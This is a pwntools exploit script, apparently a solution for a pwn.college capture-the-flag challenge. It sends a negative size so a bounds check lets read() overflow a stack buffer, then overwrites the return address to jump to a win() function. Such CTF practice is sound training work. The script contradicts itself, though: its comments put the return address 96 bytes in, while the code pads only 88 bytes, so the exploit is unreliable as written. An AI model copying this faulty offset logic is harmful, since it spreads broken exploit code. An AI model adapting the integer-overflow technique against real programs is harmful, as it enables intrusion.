# the related url is https://pwn.college/program-security/program-security/

# Return Address Overwrite Challenge - Integer Overflow Vulnerability
#
# Decompiled analysis:
# - Buffer starts at var_58h (rbp - 0x58 = rbp - 88)
# - Size check: if (0x36 < nbyte) -> max allowed is 54 bytes (0x36 = 54)
# - Return address is at rbp + 8
# - Offset from buffer to return address: 88 + 8 = 96 bytes (0x60)
#
# THE VULNERABILITY:
# - nbyte is declared as int32_t (SIGNED integer)
# - The check: if (0x36 < nbyte) only blocks positive values > 54
# - But read(0, buf, nbyte) casts nbyte to size_t (UNSIGNED)
# - If we send a NEGATIVE number:
#   * It passes the check (e.g., -1 is NOT > 54)
#   * read() interprets it as huge unsigned value (0xFFFFFFFF = 4GB)
#   * This allows us to overflow the buffer and overwrite the return address!
#
# Stack layout:
# var_58h (buffer start) -> ... -> rbp -> return address (rbp+8)
# Offset to return address: 96 bytes (0x60)

from pwn import *

# Start the challenge process
io = process("/challenge/bounds-breaker-hard")

# Address of win() function
win_addr = 0x00401884

# Calculate offset to return address
# Buffer at rbp - 0x58 (88 bytes), return address at rbp + 8
offset = 0x58

# Create payload: padding + win address
payload = b"A" * offset
payload += p64(win_addr)

# EXPLOIT: Send negative size to bypass the check
# -1 as signed int32 = 0xFFFFFFFF as unsigned = 4,294,967,295 bytes
# This passes the check (since -1 is not > 54)
# But read() will accept up to 4GB of data, way more than we need
io.sendline(b"-1")

# Send the payload
io.sendline(payload)

# Get the flag
io.interactive()
